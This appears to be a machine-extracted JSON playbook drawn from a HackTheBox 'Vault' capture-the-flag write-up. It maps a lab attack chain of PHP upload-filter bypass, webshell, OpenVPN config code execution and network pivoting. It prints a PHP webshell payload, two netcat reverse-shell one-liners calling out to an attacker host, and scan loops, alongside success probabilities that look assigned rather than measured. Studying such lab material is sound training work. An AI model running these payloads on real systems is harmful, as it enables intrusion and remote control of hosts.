@@ -1,0 +1,880 @@
+{
+  "writeup_id": "Htb_Vault",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_upload_bypass_pivot",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "file_upload_bypass",
+    "privilege_path": "web_shell_to_network_pivot",
+    "attack_complexity": "medium",
+    "estimated_time": "2-4 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "php_upload_filter_bypass",
+      "multi_vm_pivot_required",
+      "openvpn_config_exploitation",
+      "firewall_traversal_needed"
+    ],
+    "environmental_clues": [
+      "apache_php_stack",
+      "ubuntu_server",
+      "virtualized_infrastructure",
+      "network_segmentation"
+    ],
+    "similar_scenarios": [
+      "networked_pivot_boxes",
+      "multi_stage_compromise"
+    ],
+    "unique_aspects": [
+      "vault_themed_target",
+      "gpg_encrypted_flags",
+      "spice_port_alternative_access",
+      "vm_recovery_mode_bypass"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "File Upload Filter Bypass",
+        "success_reason": "Upload filter only checked file extension, not content type or file headers",
+        "prerequisite_indicators": [
+          "file_upload_functionality_present",
+          "web_application_accessible",
+          "upload_directory_web_accessible"
+        ],
+        "recognition_patterns": [
+          "upload form present on web application",
+          "error messages reveal filtering logic",
+          "alternative extensions accepted (php5, ph3, etc)",
+          "uploaded files accessible via direct URL"
+        ],
+        "failure_modes": [
+          "content_type_validation_implemented",
+          "file_header_magic_bytes_checked",
+          "uploaded_files_not_web_accessible",
+          "comprehensive_extension_blacklist"
+        ],
+        "environmental_factors": [
+          "legacy_php_configuration",
+          "insufficient_upload_validation",
+          "web_accessible_upload_directory"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Directory Enumeration",
+        "success_reason": "Hidden directories discoverable through logical naming patterns and brute force",
+        "prerequisite_indicators": [
+          "web_server_responds_to_requests",
+          "directory_listing_disabled",
+          "predictable_naming_conventions"
+        ],
+        "recognition_patterns": [
+          "403 forbidden responses indicate existing directories",
+          "customer/company names in content suggest directory paths",
+          "common web application structure patterns"
+        ],
+        "failure_modes": [
+          "comprehensive_access_controls",
+          "non_standard_directory_structure",
+          "rate_limiting_implemented"
+        ],
+        "environmental_factors": [
+          "default_apache_configuration",
+          "developer_naming_conventions",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "changelogo.php upload functionality",
+        "discovery_method": "Directory enumeration following logical paths",
+        "why_critical": "Provided file upload capability leading to code execution",
+        "how_to_recognize": [
+          "upload forms in web applications",
+          "design/admin related directories",
+          "file management functionality"
+        ],
+        "follow_up_actions": [
+          "test_upload_restrictions",
+          "enumerate_allowed_extensions",
+          "attempt_php_shell_upload"
+        ]
+      },
+      {
+        "discovery": "php5 extension bypass",
+        "discovery_method": "Extension enumeration via Burp Intruder",
+        "why_critical": "Allowed PHP code execution despite upload filters",
+        "how_to_recognize": [
+          "alternative php extensions accepted",
+          "different response lengths for allowed/blocked files",
+          "legacy php configuration indicators"
+        ],
+        "follow_up_actions": [
+          "upload_php_webshell",
+          "establish_reverse_shell",
+          "enumerate_system_access"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_shell",
+        "escalation_method": "File_System_Access_to_Credentials",
+        "why_possible": "Web application had access to user home directories with sensitive files",
+        "recognition_signs": [
+          "accessible_home_directories",
+          "credential_files_in_user_spaces",
+          "network_configuration_files_present"
+        ],
+        "exploitation_path": "Upload Shell → File System Access → Credential Discovery → Lateral Movement"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 and 80 open on Linux host",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface requires thorough web app testing",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_bruteforce",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known CVEs exist"
+          }
+        ],
+        "success_indicators": [
+          "web_directories_found",
+          "file_upload_functionality",
+          "authentication_bypass"
+        ],
+        "next_decision": "enumerate_web_directories"
+      },
+      {
+        "step": 2,
+        "situation": "Found upload functionality with file extension filtering",
+        "decision": "Test alternative PHP extensions to bypass filters",
+        "reasoning": "Upload filters often check extensions but may allow variants",
+        "confidence": 0.85,
+        "prerequisites": [
+          "upload_form_identified",
+          "php_extension_blocked"
+        ],
+        "success_indicators": [
+          "alternative_extension_uploads",
+          "code_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "mime_type_bypass",
+          "double_extension_attack",
+          "null_byte_injection"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Achieved web shell via php5 extension bypass",
+        "decision": "Enumerate local files for credentials and network information",
+        "reasoning": "Web shells provide limited functionality, need credential escalation",
+        "confidence": 0.95,
+        "prerequisites": [
+          "web_shell_uploaded",
+          "command_execution_confirmed"
+        ],
+        "success_indicators": [
+          "credentials_found",
+          "network_topology_discovered"
+        ],
+        "next_decision": "escalate_to_interactive_shell"
+      },
+      {
+        "step": 4,
+        "situation": "Found credentials in user desktop files",
+        "decision": "Test credentials for privilege escalation and lateral movement",
+        "reasoning": "Desktop files often contain sensitive information",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "su_command",
+            "when": "if same host credentials"
+          },
+          {
+            "option": "ssh_login",
+            "when": "if remote access needed"
+          },
+          {
+            "option": "service_authentication",
+            "when": "if service-specific creds"
+          }
+        ],
+        "success_indicators": [
+          "privilege_escalation_successful",
+          "new_user_access"
+        ],
+        "next_decision": "enumerate_network_topology"
+      },
+      {
+        "step": 5,
+        "situation": "Discovered internal network with multiple hosts",
+        "decision": "Perform network reconnaissance to identify pivot targets",
+        "reasoning": "Internal networks often contain high-value targets",
+        "confidence": 0.85,
+        "prerequisites": [
+          "network_range_identified",
+          "host_connectivity_confirmed"
+        ],
+        "success_indicators": [
+          "active_hosts_discovered",
+          "services_enumerated"
+        ],
+        "next_decision": "identify_pivot_opportunities"
+      }
+    ],
+    "branching_logic": {
+      "if_upload_bypass_succeeds": {
+        "action": "establish_persistent_shell",
+        "tools": [
+          "reverse_shell",
+          "netcat",
+          "python_pty"
+        ],
+        "next_phase": "local_enumeration"
+      },
+      "if_credentials_found": {
+        "action": "test_credential_reuse",
+        "alternatives": [
+          "su",
+          "ssh",
+          "service_login"
+        ],
+        "decision_criteria": "based_on_credential_context"
+      },
+      "if_network_discovered": {
+        "action": "pivot_enumeration",
+        "purpose": "identify_high_value_targets",
+        "tools": [
+          "ping_sweep",
+          "port_scanning",
+          "service_enumeration"
+        ]
+      },
+      "if_pivot_required": {
+        "action": "establish_tunnel_or_proxy",
+        "tools": [
+          "ssh_tunnel",
+          "chisel",
+          "socat"
+        ],
+        "decision_criteria": "based_on_network_accessibility"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_php_extension_variants_on_upload",
+        "reasoning": "php5_php3_php4_often_bypass_basic_filters",
+        "applicability": "file_upload_functionality_present"
+      },
+      {
+        "rule": "enumerate_user_desktop_and_documents_immediately",
+        "reasoning": "high_probability_of_credential_discovery",
+        "applicability": "file_system_access_obtained"
+      },
+      {
+        "rule": "perform_network_discovery_after_any_privilege_escalation",
+        "reasoning": "internal_networks_often_accessible_from_compromised_hosts",
+        "applicability": "user_level_access_achieved"
+      },
+      {
+        "rule": "test_credential_reuse_across_all_discovered_services",
+        "reasoning": "users_frequently_reuse_passwords",
+        "applicability": "any_credentials_discovered"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "PHP File Upload Filter Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "php"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_enabled_webserver",
+          "file_upload_functionality",
+          "weak_extension_filtering"
+        ],
+        "success_indicators": [
+          "upload_form_present",
+          "php_extension_blocked_message",
+          "uploads_directory_accessible",
+          "different_response_lengths_by_extension"
+        ],
+        "incompatible_with": [
+          "no_file_upload",
+          "strict_mime_type_checking",
+          "server_side_file_validation",
+          "uploads_not_executable"
+        ],
+        "confidence_boosters": [
+          "error_messages_reveal_filtering",
+          "uploads_directory_browsable",
+          "php_info_available",
+          "legacy_php_versions"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Directory Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "predictable_directory_structure"
+        ],
+        "success_indicators": [
+          "403_forbidden_responses",
+          "different_status_codes",
+          "directory_listing_enabled",
+          "common_paths_exist"
+        ],
+        "incompatible_with": [
+          "custom_404_handling",
+          "rate_limiting_strict",
+          "waf_protection"
+        ],
+        "confidence_boosters": [
+          "apache_default_pages",
+          "common_cms_patterns",
+          "backup_files_present",
+          "development_paths"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-20 minutes"
+      },
+      {
+        "technique": "SSH Credential Reuse",
+        "mitre_id": "T1078",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "ssh_service_accessible",
+          "credentials_discovered",
+          "password_authentication_enabled"
+        ],
+        "success_indicators": [
+          "ssh_banner_present",
+          "password_auth_allowed",
+          "no_fail2ban_detected"
+        ],
+        "incompatible_with": [
+          "key_only_authentication",
+          "account_lockout_strict",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_ssh_config",
+          "weak_password_policies",
+          "shared_credentials_found"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "2-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "php_web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "php"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "PHP"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "linux_server": {
+        "port_indicators": [
+          22,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "ssh",
+          "http"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH",
+          "Apache"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "file_upload_functionality": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "technology_indicators": [
+          "upload",
+          "form",
+          "multipart"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_paths"
+        },
+        {
+          "attack": "file_upload_bypass",
+          "when": "upload_form_discovered",
+          "reason": "direct_code_execution_potential"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "common_service_often_misconfigured"
+        },
+        {
+          "attack": "web_parameter_fuzzing",
+          "when": "php_application_detected",
+          "reason": "php_apps_often_have_parameter_issues"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "PHP File Upload Filter Bypass",
+        "mitre_id": "T1105",
+        "category": "defense_evasion",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "burp_intruder",
+            "command_template": "Use Burp Intruder to test file extensions",
+            "actual_command": "Test extensions: png,jpg,gif,txt,php,ph3,ph4,ph5,php3,php4,php5,png.php",
+            "output_pattern": "Different response lengths indicate allowed/blocked extensions",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -s http://{target}/uploads/{shell}.php5?cmd={command}",
+            "actual_command": "curl -s http://10.10.10.109/sparklays/design/uploads/cmd.php5?cmd=id",
+            "success_factors": [
+              "php5_extension_allowed",
+              "uploads_directory_accessible"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality_exists",
+          "web_server_executes_php",
+          "uploads_directory_accessible"
+        ],
+        "success_indicators": [
+          "file_uploads_successfully",
+          "webshell_executes_commands",
+          "system_command_output_returned"
+        ],
+        "common_failures": [
+          "all_php_extensions_blocked",
+          "uploads_directory_not_executable",
+          "file_content_filtering_active"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "OpenVPN Configuration RCE",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "lateral_movement",
+        "tools_used": [
+          {
+            "name": "malicious_ovpn_config",
+            "command_template": "script-security 2\nup \"/bin/bash -c '{reverse_shell_payload}'\"",
+            "actual_command": "up \"/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'\"",
+            "output_pattern": "Command execution upon VPN connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "openvpn_config_upload_functionality",
+          "script_security_not_restricted",
+          "network_connectivity_to_attacker"
+        ],
+        "success_indicators": [
+          "config_file_accepted",
+          "vpn_connection_initiated",
+          "reverse_shell_received"
+        ],
+        "common_failures": [
+          "script_security_disabled",
+          "network_isolation_prevents_callback",
+          "config_validation_blocks_malicious_entries"
+        ],
+        "follow_up_techniques": [
+          "network_enumeration",
+          "credential_harvesting",
+          "firewall_bypass"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "SSH Dynamic Port Forwarding",
+        "mitre_id": "T1090.001",
+        "category": "command_and_control",
+        "phase": "lateral_movement",
+        "tools_used": [
+          {
+            "name": "ssh",
+            "command_template": "ssh -D {local_port} {user}@{target}",
+            "actual_command": "ssh> -D 8081 (from existing SSH session)",
+            "output_pattern": "Forwarding port.",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "ssh_access_to_pivot_host",
+          "target_networks_accessible_from_pivot",
+          "proxy_client_configured"
+        ],
+        "success_indicators": [
+          "socks_proxy_established",
+          "internal_networks_accessible",
+          "web_interfaces_reachable"
+        ],
+        "common_failures": [
+          "ssh_session_drops",
+          "firewall_blocks_internal_access",
+          "proxy_configuration_incorrect"
+        ],
+        "follow_up_techniques": [
+          "internal_network_enumeration",
+          "web_application_testing",
+          "service_exploitation"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Network Host Discovery",
+        "mitre_id": "T1018",
+        "category": "discovery",
+        "phase": "lateral_movement",
+        "tools_used": [
+          {
+            "name": "ping_sweep",
+            "command_template": "for i in $(seq 1 254); do (ping -c 1 {network}.${i} | grep \"bytes from\" &); done",
+            "actual_command": "for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep \"bytes from\" &); done",
+            "output_pattern": "64 bytes from {ip}: icmp_seq=1 ttl=64",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "nc_port_scan",
+            "command_template": "for i in $(seq 1 65535); do (nc -zvn {target} ${i} 2>&1 | grep -v \"Connection refused\" &); done",
+            "actual_command": "for i in $(seq 1 65535); do (nc -zvn 192.168.122.4 ${i} 2>&1 | grep -v \"Connection refused\" &); done",
+            "success_factors": [
+              "target_responsive",
+              "ports_not_filtered"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "network_access_from_compromised_host",
+          "icmp_not_blocked",
+          "basic_shell_access"
+        ],
+        "success_indicators": [
+          "live_hosts_identified",
+          "open_ports_discovered",
+          "services_enumerated"
+        ],
+        "common_failures": [
+          "icmp_blocked_by_firewall",
+          "network_segmentation_prevents_access",
+          "rate_limiting_blocks_scans"
+        ],
+        "follow_up_techniques": [
+          "service_enumeration",
+          "vulnerability_scanning",
+          "credential_testing"
+        ],
+        "time_investment": "5-30 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Intruder",
+        "use_case": "file_extension_filter_bypass",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "manual_testing",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "test_comprehensive_extension_list",
+          "analyze_response_differences",
+          "validate_execution_after_upload"
+        ]
+      },
+      {
+        "tool": "SSH Dynamic Forwarding",
+        "use_case": "internal_network_access",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_pivoting"
+        ],
+        "alternatives": [
+          "chisel",
+          "socat",
+          "metasploit_pivoting"
+        ],
+        "best_practices": [
+          "use_high_numbered_local_ports",
+          "configure_proxy_chains_for_tools",
+          "monitor_connection_stability"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "php_upload_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create payload: <?php system($_REQUEST['cmd']); ?>",
+            "purpose": "Create simple PHP webshell",
+            "expected_output": "PHP command execution payload"
+          },
+          {
+            "step": 2,
+            "command": "Upload file with .php5 extension via web form",
+            "purpose": "Bypass extension filtering",
+            "expected_output": "File uploaded successfully"
+          },
+          {
+            "step": 3,
+            "command": "curl -s http://target/uploads/shell.php5?cmd=id",
+            "purpose": "Test command execution",
+            "expected_output": "uid=33(www-data) gid=33(www-data)"
+          },
+          {
+            "step": 4,
+            "command": "curl 'http://target/shell.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%20attacker_ip%20443%20%3E/tmp/f'",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Interactive shell connection"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "openvpn_config_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create malicious .ovpn config with 'up' directive",
+            "purpose": "Prepare RCE payload",
+            "expected_output": "Malicious OpenVPN configuration file"
+          },
+          {
+            "step": 2,
+            "command": "Upload config via web interface",
+            "purpose": "Deploy malicious configuration",
+            "expected_output": "Configuration accepted"
+          },
+          {
+            "step": 3,
+            "command": "Trigger VPN connection test",
+            "purpose": "Execute payload",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Vault",
+      "difficulty": "Medium",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2018-11-03",
+      "author": "nol0gz",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "file_upload",
+        "network_pivoting",
+        "vpn_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "php_upload_filter_bypass",
+        "openvpn_config_rce",
+        "firewall_misconfiguration"
+      ],
+      "environment_type": "multi_tier_network",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "network_pivoting",
+        "multi_host_exploitation",
+        "firewall_bypass",
+        "gpg_decryption"
+      ],
+      "prerequisite_knowledge": [
+        "php_exploitation",
+        "network_fundamentals",
+        "vpn_concepts",
+        "linux_administration"
+      ]
+    },
+    "categorization": {
+      "primary_category": "network_pivoting",
+      "subcategories": [
+        "file_upload",
+        "vpn_exploitation",
+        "firewall_bypass",
+        "cryptography"
+      ],
+      "attack_types": [
+        "initial_access",
+        "lateral_movement",
+        "defense_evasion"
+      ],
+      "defensive_lessons": [
+        "secure_file_uploads",
+        "network_segmentation",
+        "vpn_hardening",
+        "proper_firewall_rules"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Reddish",
+        "Inception",
+        "Rabbit"
+      ],
+      "similarity_reasons": [
+        "multi_tier_pivoting",
+        "vm_environments",
+        "complex_network_topology"
+      ],
+      "unique_aspects": [
+        "spice_port_exploitation",
+        "vm_recovery_mode",
+        "gpg_encrypted_flags"
+      ],
+      "difficulty_factors": [
+        "multiple_pivot_points",
+        "firewall_traversal",
+        "vm_management_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T15:59:31.462594",
+    "original_file": "0xdf_writeups/Htb Vault.md",
+    "content_length": 46891,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
